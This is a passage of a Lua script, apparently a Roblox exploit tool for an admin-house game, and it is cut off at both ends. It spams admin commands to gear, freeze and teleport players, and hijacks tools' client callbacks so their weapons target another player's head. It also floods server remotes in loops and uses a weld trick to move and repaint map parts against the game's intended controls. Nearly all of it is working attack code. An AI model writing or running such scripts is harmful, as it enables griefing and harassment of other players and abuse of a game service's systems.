    	thepartfake.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-5,0)

    	task.wait(0.25)
    	Chat("tp "..pln.." me")
        repeat task.wait() until game.Players.LocalPlayer:DistanceFromCharacter(plr.Character.Head.Position) < 10

        Chat("freeze "..pln)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = plr.Character.Head.CFrame * CFrame.new(0,25,1.5)
        
	for i = 1, 50 do
    		Chat("gear me 200237939")
    	end

   	repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() > 40
	task.wait(0.1)

   	for i, x in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        	spawn(function()
        		x.Parent = game.Players.LocalPlayer.Character
       		 	task.wait(0.1)
        		x.LocalScript.Disabled = true
       	 		x:WaitForChild("RemoteControl"):WaitForChild("ClientControl").OnClientInvoke =
						function(Value)
        						return plr.Character.Head.Position + Vector3.new(0,2,0)
        					end
        		repeat task.wait()
				x:Activate()
        		until x.Parent ~= game.Players.LocalPlayer.Character
        	end)
   	end
    
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() < 5
        task.wait(0.4)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,0,0)
        Chat("respawn me")
    end

function RFGUN(bullets)
		Connections.rapidfiregun = game:GetService("UserInputService").InputBegan:Connect(function(inputa,gp)
			if gp then return end
			if inputa.UserInputType == Enum.UserInputType.MouseButton1 then
		
				for i = 1, bullets do
    					Chat("gear me 139578207")
    					task.wait()
				end
			
				task.wait(0.2)
			
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
    					v.Parent = game.Players.LocalPlayer.Character
    					task.wait()
    					local clickc = game.Players.LocalPlayer:GetMouse().Hit.p
   					v.Click:FireServer(clickc)
				end
			
				for i = 1, bullets do
    					task.wait(0.1)
				end

				Chat("ungear me")
			end
		end)
end

function ASTRIKE()
		Connections.airstrike = game:GetService("UserInputService").InputBegan:Connect(function(inputa,gp)
			if gp then return end
			if inputa.UserInputType == Enum.UserInputType.MouseButton1 then
		
				for i = 1, 5 do
            				Chat("gear me 169602103")
            			end
		
            			repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 5

				local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
         			for _, v in ipairs(Backpack:GetChildren()) do
                            		v.Parent = game.Players.LocalPlayer.Character
				end
			
				for i = 1, 1000 do
                			pcall(function()
                   				 game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(game.Players.LocalPlayer:GetMouse().Hit.p,Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200)))
                			end)
           			end
           
				task.wait(10)
		
            			Chat("ungear me")
			end
		end)
end

function rcannon(mode)
   	local theblue = 15
        for i = 1, theblue do
            	Chat("gear me 79446473")
            	repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("Railgun")
		rag = game.Players.LocalPlayer.Backpack:FindFirstChild("Railgun")
            	rag.GripPos = (CFrame.Angles(0,0,math.rad(i*(360/i)))*CFrame.new(math.cos(i*(360/i))*10,0,math.sin(i*(i/360))*10)).p
            	rag.Parent = game.Players.LocalPlayer.Character
       	 end

        task.wait(0.25)
        Chat("invis me")
   	game.Players.LocalPlayer.Character.Humanoid.HipHeight = 8

        Connections.cannoning = game:GetService("UserInputService").InputBegan:Connect(function(inputa,gp)
   	        if gp then return end
    		if inputa.UserInputType == Enum.UserInputType.MouseButton1 then
        		
			for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            			if v:IsA("Tool") then
					if mode == "wide" then
						v.Click:FireServer((v.Handle.CFrame*CFrame.new(0,0,-100)).p)
					else
               			 		v.Click:FireServer(game.Players.LocalPlayer:GetMouse().Hit.p)
					end
           			end
       			end

    			Chat("reset me")
    		end
   	end)
end

function Clone(getnum)
	 Chat("ungear me");task.wait(0.5)
         local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
         for i = 1, tonumber(getnum) do
                    Chat('gear me 72644644');task.wait(0.01)
         end
         local oldchild = #workspace:GetChildren()
         repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
         local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
         for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            v:Activate()
         end
         repeat task.wait() until (#workspace:GetChildren() - oldchild) >= tonumber(getnum) 
         Chat("ungear me")
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end

function Table(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 110789105");task.wait(0.01)
        end
  --      local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Potion(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 27858062");task.wait(0.01)
        end
      --  local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function MineTrip(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 11999247");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Cannon(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 42201538");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Spike(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 59848474");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
        end
	task.wait(0.1)
	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    		if v:IsA("Tool") then
        		v.ClientInput:FireServer(Enum.KeyCode.E)
        		task.wait()
        		v:Activate()
       			task.wait()
        		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(360/tonumber(getnum)),0)
    		end
	end
end

function Zombie(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 26421972");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Alpaca(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 292969139");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Piano(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 113299590");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Bassdrop(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 152233094");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Coolstory(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 119101643");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Banana(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 29100449");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function TankGuitar(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 47871615");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function SkeleFriend(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 63253701");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Spray(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 273795078");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end 

--// ATTACHING STUFF \\ --
local Player = game.Players.LocalPlayer
local PlayerService = game:GetService("Players")

-- // attach v2 - Credits go to quiving's CMD-Y! \\ --
function moveobject(part, o)
                if movestatus == false then
                        movestatus = true
                        if o == 1 then
                                if allclear() == true then
                                        removelimbs()
                                        task.wait()
                                        workspace.Gravity = 0
                                        Chat("size me .5")
                                        workspace.FallenPartsDestroyHeight = 0/0
                                        Chat("gear me 108158379")
                                        repeat fwait() until Player.Backpack:FindFirstChild("IvoryPeriastron")
                                        Player.Character.Humanoid:EquipTool(Player.Backpack:FindFirstChild("IvoryPeriastron"))
                                        local ivory = Player.Character:FindFirstChild("IvoryPeriastron")
                                        local randcoord = CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455))
                                        Player.Character.HumanoidRootPart.CFrame = randcoord
                                        PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                                        if Player.Character.Torso:FindFirstChild("Weld") then
                                                Player.Character.Torso:FindFirstChild("Weld"):Destroy()
                                        end
                                        task.wait(.25)
                                        if not Player.Character:FindFirstChild("IvoryPeriastron") then
                                                ColFix()
                                                GravFix()
                                                Chat("respawn me")
                                                movestatus = false
                                                return
                                        end
                                        ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
                                        task.wait(.25)
                                        attach(part)
                                        task.wait(.25)
                                        if not Player.Character:FindFirstChild("IvoryPeriastron") then
                                                ColFix()
                                                GravFix()
                                                Chat("respawn me")
                                                movestatus = false
                                                return
                                        end
                                        ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
                                        task.wait(.25)
                                        movestatus = false
                                else
                                                Chat("respawn me")
                                                ColFix()
                                                GravFix()
                                                Remind("Something went wrong removing the parts.")
                                end
                        elseif o == 2 then
                                local movcord = false
                                if allclear() == true then
                                        removelimbs()
                                        task.wait()
                                        Chat("size me .5")
                                        workspace.Gravity = 0
                                        workspace.FallenPartsDestroyHeight = 0/0
                                        Chat("gear me 108158379")
                                        repeat fwait() until Player.Backpack:FindFirstChild("IvoryPeriastron")
                                        Player.Character.Humanoid:EquipTool(Player.Backpack:FindFirstChild("IvoryPeriastron"))
                                        local ivory = Player.Character:FindFirstChild("IvoryPeriastron")
                                        local newcoord = CFrame.new(ogcframes[part.Name][1],ogcframes[part.Name][2],ogcframes[part.Name][3],ogcframes[part.Name][4],ogcframes[part.Name][5],ogcframes[part.Name][6],ogcframes[part.Name][7],ogcframes[part.Name][8],ogcframes[part.Name][9],ogcframes[part.Name][10],ogcframes[part.Name][11],ogcframes[part.Name][12]) * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0)
                                        movcord = true
                                        task.spawn(function()
                                                while movcord do
                                                        fwait() 
                                                        Player.Character.HumanoidRootPart.CFrame = newcoord
                                                        if movcord == false then 
                                                                break 
                                                        end
                                                end
                                        end)
                                        repeat fwait() 
                                        until Player.Character.HumanoidRootPart.CFrame == newcoord
                                        movcord = false
                                        if Player.Character.Torso:FindFirstChild("Weld") then
                                                Player.Character.Torso:FindFirstChild("Weld"):Destroy()
                                        end
                                        PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                                        task.wait(.25)
                                        if not Player.Character:FindFirstChild("IvoryPeriastron") then
                                                ColFix()
                                                GravFix()
                                                Chat("respawn me")
                                                movestatus = false
                                                return
                                        end
                                        ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
                                        task.wait(.25)
                                        attach(part)
                                        task.wait(.25)
                                        if not Player.Character:FindFirstChild("IvoryPeriastron") then
                                                ColFix()
                                                GravFix()
                                                Chat("respawn me")
                                                movestatus = false
                                                return
                                        end
                                        ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
                                        task.wait(.25)
                                        movestatus = false
                                else
                                        movcord = false
                                        Chat("respawn me")
                                        ColFix()
                                        GravFix()
                                        Remind("Something went wrong removing the parts.")
                                end
                        end
                end
        end

-- // remove limbs \\ --
function removelimbs()
        for i,v in pairs(PlayerService.LocalPlayer.Character.Torso:GetChildren()) do
                if v.Name == "Left Shoulder" then
                                v:Destroy()
                end
                if v.Name == "Left Hip" then
                                v:Destroy()
                end
                if v.Name == "Right Hip" then
                                v:Destroy()
                end
        end
end

-- // attach to the part \\ --
function attach(part)
                if Player.Character.Torso:FindFirstChild("Weld") then
                        Player.Character.Torso:FindFirstChild("Weld"):Destroy()
                end
                PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                local tasmove = true

                task.spawn(function()
                        if Player.Character.Torso:FindFirstChild("Weld") then
                                Player.Character.Torso:FindFirstChild("Weld"):Destroy()
                        end
                        while true do
                                fwait()
                                if allclear() == true then
                                        --print("debug msg 1")
                                        PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                                        Player.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0) 
                                elseif allclear() == false then
                                        Chat("respawn me")
                                        ColFix()
                                        GravFix()
                                        Remind("Something went wrong moving the parts. Fixing game and respawning..")
                                        tasmove = false
                                end
                                if tasmove == false then 
                                        break 
                                end
                        end
                end)

                task.spawn(function() 
                        while tasmove do 
                                fwait()
                                Chat("unpunish me")
                                if allclear() == false then 
                                        Chat("respawn me")
                                        ColFix()
                                        GravFix()
                                        Remind("Something went wrong moving the parts. Fixing game and respawning..")
                                        tasmove = false
                                end 
                                if tasmove == false then 
                                        break 
                                end
                        end
                end)

                repeat fwait() Player.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0) 
                until Player.Character.HumanoidRootPart.CFrame == part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0)
                repeat 
                        fwait() 
                        if allclear() == false then
                                break
                        end
                until 
                Player.Character.Torso:FindFirstChild("Weld")
                tasmove = false
end


task.spawn(function()
        while true do
                task.wait()
                if allclear() == false and movestatus == true then
                        Chat("respawn me")
                        ColFix()
                        GravFix()
                        Remind("Moving the part has stopped due to no character or no admin, respawning and fixing game..")
                end
        end
end)

-- // check if ready \\ --
function allclear()
                if workspace:FindFirstChild(game.Players.LocalPlayer.Name) and hasperm == true and workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid") and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid").Health > 0 then
                        --print("TRUE")
                        return true
                elseif workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace.Terrain._Game.Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") and workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid") and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid").Health > 0 then
                        --print("TRUE")
                        return true
                else
                        --print("FALSE")
                        movestatus = false
                        return false
                end
end

-- // special wait \\ --
function fwait()
                game:GetService("RunService").Heartbeat:Wait()
end

-- // another special wait \\ --
function rwait()
        game:GetService("RunService").RenderStepped:Wait()
end

-- // Attaching v3 - credits to ii admin and pr admin \\ -- 
-- // Not a replacement to the cmd y, just used for certain things \\ --
-- // sux \\ --
local lp = game.Players.LocalPlayer

function moveObject(target,movepos)

    function equipivory()
            if lp.Backpack:FindFirstChild("IvoryPeriastron") then
                    lp.Backpack.IvoryPeriastron.Parent = lp.Character
            else
                        if not lp.Character:FindFirstChild("IvoryPeriastron") then
                    Chat("gear me 108158379")
                    repeat wait() until lp.Backpack:FindFirstChild("IvoryPeriastron")
                    lp.Backpack.IvoryPeriastron.Parent = lp.Character
                end
            end
    end

    equipivory()

    if lp.Character:FindFirstChild("IvoryPeriastron") then
                local cf = lp.Character.HumanoidRootPart
                local veloing = true
                local gopos = movepos

                spawn(function()
                        repeat rwait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gopos
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
                        until not veloing
                end)

                wait(0.2)
                veloing = false
                lp.Character.IvoryPeriastron.Remote:FireServer(Enum.KeyCode.E)
                cf.Anchored = false
                local moveinnit = true

                local partinstance = Instance.new("Part",cf.Parent)
                partinstance.Anchored = true
                partinstance.Size = Vector3.new(10,1,10)
                partinstance.CFrame = (target.CFrame * CFrame.new(-1*(target.Size.X/2)-(lp.Character['Torso'].Size.X/2), 0, 0)) * CFrame.new(0,-3.5,0)

                spawn(function()
                        while true do
                                fwait()
                                game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                                target.RotVelocity = Vector3.new(0,0,0)
                                target.Velocity = Vector3.new(0,0,0)
                                cf.Velocity = Vector3.new(0,0,0)
                                cf.RotVelocity = Vector3.new(0,0,0)
                                    cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(lp.Character['Torso'].Size.X/2), 0, 0)
                                if not moveinnit then 
                                        break 
                                end
                        end
                end)

                spawn(function() 
                        while moveinnit do 
                                fwait() 
                                Chat('unpunish me') 
                        end 
                end)

                wait(0.3)
                moveinnit = false
                lp.Character.IvoryPeriastron.Remote:FireServer(Enum.KeyCode.E)
                wait(0.3)
                Chat("respawn me")

        end
end

-- part mover tool :O
function yeahthemover(modez)
	local btool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
  	local SelectionBox = Instance.new("SelectionBox", game.Workspace)
  	local thebtool = Instance.new("Part")
 	thebtool.Parent = btool
 	thebtool.Name = ("Handle")
 	thebtool.CanCollide = false
 	thebtool.Anchored = false

	SelectionBox.Name = "SelectBox"
  	SelectionBox.LineThickness = 0.05
	SelectionBox.Adornee = nil
        SelectionBox.Color3 = Color3.fromRGB(0,0,255)
	SelectionBox.Visible = false
        btool.Name = "Delete Tool"
        btool.RequiresHandle = false
        local iseq = false
        local Mouse = game.Players.LocalPlayer:GetMouse()
  
  	btool.Equipped:connect(function()
   		iseq = true
   		SelectionBox.Visible = true
   		SelectionBox.Adornee = nil
  	end)
  
  	btool.Unequipped:connect(function()
 	  	iseq = false
 	 	SelectionBox.Visible = false
 		SelectionBox.Adornee = nil
  	end)

	btool.Activated:connect(function()
  		if iseq then
    			btool.Parent = game.Chat
	
   			local explode = Instance.new('Explosion')
   			explode.BlastRadius = 0
   			explode.Position = Mouse.Target.Position
   			explode.Parent = game.Workspace
		
   			local prevcfarchive = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			local target = Mouse.Target

			if modez == "no" then
				movepart(target)
		        	repeat task.wait() until mready == true
		
				for i = 1, 5 do
					Chat("skydive me")
				end
				task.wait(0.1)
				Chat("respawn me")
				task.wait(0.25)
			else 
				moveobject(target, 1)
				task.wait(1.75)
			end
		
			game.Chat["Delete Tool"].Parent = game.Players.LocalPlayer.Backpack
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = prevcfarchive
		
			spawn(function()
    				task.wait(3)
    				if game.Chat:FindFirstChild("Delete Tool") then
        				game.Chat["Delete Tool"]:Destroy()
    				end
			end)
		end
	end)
end

-- attach v1 for fixing baseplate --
function movepart(target)
	repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
	local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
	local rmoving = true;mready = false

	task.spawn(function()
			while true do
				fwait()
				game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
				cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
				if not rmoving then 
					break 
				end
			end
	end)
		
	task.spawn(function() 
			while rmoving do 
				task.wait(.1) 
				Chat('unpunish me') 
			end 
	end)

	task.wait(0.25)
        repeat wait() until game.Players.LocalPlayer.Character.Torso:FindFirstChild("Weld")
	rmoving = false;mready = true

end

-- // COLOR API \\ --
-- // the reason why there's dupes is because of rainbow map needing the RGB instead of colour name and the api not having a conversion \\ --

colorAPI = {}
 
colorAPI.color = function(Part, color)
	local thread = coroutine.create(function() -- x3.5 speed boost
		local Arguments =
        {
            ["Part"] = Part,
            ["Color"] = color
        }
        game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Arguments)
	end)
	coroutine.resume(thread)
end

 
colorAPI.color_2 = function(Part, R,G,B)
	local thread = coroutine.create(function() -- x3.5 speed boost
		local Arguments =
        {
            ["Part"] = Part,
            ["Color"] = Color3.new(R,G,B)
        }
        game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Arguments)
	end)
	coroutine.resume(thread)
end
 
colorAPI.transformToColor3 = function(col)
    local r = col.r
    local g = col.g
    local b = col.b
    return Color3.new(r,g,b);
end

colorAPI.transformToColor3_2 = function(BrickClr)
	if typeof(BrickClr) == "BrickColor" then
		return BrickClr.Color.R,BrickClr.Color.G,BrickClr.Color.B
	end
end

-- colorAPI.Color3 = function(brickColor)
--     return colorAPI.transformToColor3(BrickColor.new(brickColor))
-- end

colorAPI.colorRegen_2 = function(R,G,B)
		if workspace.Terrain._Game.Admin:FindFirstChild("Regen") then
			colorAPI.color_2(workspace.Terrain._Game.Admin.Regen,R,G,B)
		end    
end    


colorAPI.colorObbyBox = function(color) -- Default is "Teal"
	for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
		colorAPI.color(v, color) -- colorAPI.transformToColor3(BrickColor.new("Bright red"))
	end
end

colorAPI.colorObbyBox_2 = function(R,G,B)
	for i,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
		colorAPI.color_2(v,R,G,B)
	end
end

colorAPI.colorObbyBricks = function(color)-- Default is "Really red"
	  for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
		colorAPI.color(v, color)
	end
end

colorAPI.colorObbyBricks_2 = function(R,G,B)
	  for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
		colorAPI.color_2(v, R,G,B)
	end
end

colorAPI.colorAdminDivs = function(color)-- Default is "Dark stone grey"
	for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
		colorAPI.color(v, color)
	end
end

colorAPI.colorAdminDivs_2 = function(R,G,B)
	for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
		colorAPI.color_2(v, R,G,B)
	end
end
 
colorAPI.colorPads = function(color)-- Default is "Bright green"
	for i,v in pairs(game.Workspace.Terrain["_Game"].Admin["Pads"]:GetChildren()) do
		colorAPI.color(v.Head, color)
	end
end

colorAPI.colorPads_2 = function(R,G,B)
	for i,v in pairs(game.Workspace.Terrain["_Game"].Admin["Pads"]:GetChildren()) do
		colorAPI.color_2(v.Head, R,G,B)
	end
end

colorAPI.colorHouse = function(arg)
	  local wallsC = arg.wallsC
	  local baseC = arg.baseC
	  local roofC = arg.roofC
	  local WANDDC = arg.WANDDC
	  local stairsC = arg.stairsC
	  local floorC = arg.floorC
	  local rooftsC = arg.rooftsC
	  local chiC = arg.chiC
 
	  -------------------------------------------------------------------- House --------------------------------------------------------------------
 
		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
			coroutine.wrap(function()
					if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or 